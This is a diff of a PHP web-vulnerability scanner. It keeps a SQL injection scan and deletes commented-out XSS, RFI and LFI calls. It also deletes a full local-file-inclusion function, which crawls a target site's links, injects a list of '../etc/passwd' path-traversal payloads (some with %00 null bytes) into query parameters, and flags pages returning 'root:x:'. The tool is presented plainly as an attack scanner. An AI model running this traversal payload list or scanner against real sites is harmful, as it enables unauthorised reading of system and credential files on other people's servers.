@@ -22,90 +22,11 @@ function full($site) {
 
     print "[-] Start SQL Injection Scan\n";
     sql($site, 1);
-  /*  print "[-] Start XSS Scan\n";
-    xss($site, 1);*/
-  /*  print "[-] Start RFI Scan\n";
-    rfi($site, 1);
-    print "[-] Start LFI Scan\n";
-    lfi($site, 1);
-    print "[-] Start full scanning mode.\n";
-    pmapwn($site, 1);*/
 }
 
 
 
 
-
-
-
-
-
-/*
- * Google Dork function
- * Fixed by d0lph1n98
- * 22 Nov 2014
- */
-
-
-
-function lfi($site = '', $full = '0') {
-    $list_lfi = array(
-        '../etc/passwd',
-        '../../etc/passwd',
-        '../../../etc/passwd',
-        '../../../../etc/passwd',
-        '../../../../../etc/passwd',
-        '../../../../../../etc/passwd',
-        '../../../../../../../etc/passwd',
-        '../../../../../../../../etc/passwd',
-        '../../../../../../../../../etc/passwd',
-        '../etc/passwd%00',
-        '../../etc/passwd%00',
-        '../../../etc/passwd%00',
-        '../../../../etc/passwd%00',
-        '../../../../../etc/passwd%00',
-        '../../../../../../etc/passwd%00',
-        '../../../../../../../etc/passwd%00',
-        '../../../../../../../../etc/passwd%00',
-        '../../../../../../../../../etc/passwd%00',
-    );
-      
-      
-        $site = $_REQUEST['site'];
-      
-        
-        $request = parse_url($site);
-        $text .= "[-] URL : $request[host]\n";
-        $text .=  "[-] Path: $request[path]\n";
-        $text .=  "[-] Try connect to host\n";
-        $url = "".$request['scheme']."://".$request['host'].$request['path']."";
-        if(con_host($url))
-        {
-            print "[+] Connect to host successful\n";
-            print Get_Info($url);
-            print "[-] Finding link on the website\n";
-            print "[+] Found link : ".count(find_link($url))."\n";
-            print "[-] Finding vulnerable...\n";
-            if(is_array(find_link($url)))
-            foreach(find_link($url) as $link) {
-                $file = explode("/", $request['path']);
-                $request['path'] = preg_replace("/".$file[count($file)-1]."/", "", $request['path']);
-                if(!preg_match("/$request[host]/", $link)) { $link = "http://$request[host]/$request[path]$link"; }
-                foreach($list_lfi as $error) {
-                    $link = preg_replace("/=(.+)/", "=$error", $link);
-                    if(preg_match("/root:x:/", con_host($link))) {
-                       $text .=  "[-]LFI vulnerable : $link\n";
-                        $save[] = $link;
-                    }
-                }
-            }
-            $text .=  "[-] Done\n";
-/*            if(is_array($save)) {
-              print_r($save);
-              }*/
-              /* print "[+] See 'vulnerable.log' for vulnerable list\n";*/
-    }
-  }
 
 
 function sql($site = '', $full = '0') {
@@ -151,9 +72,6 @@ function sql($site = '', $full = '0') {
             $text .=  "[+] Done\n";
             echo $text;
             die;
-          /*  if(is_array($save)) {foreach($save as $link) {
-                print($link);
-               }}*/
     }
 
      $text .=  "[+] Done\n";
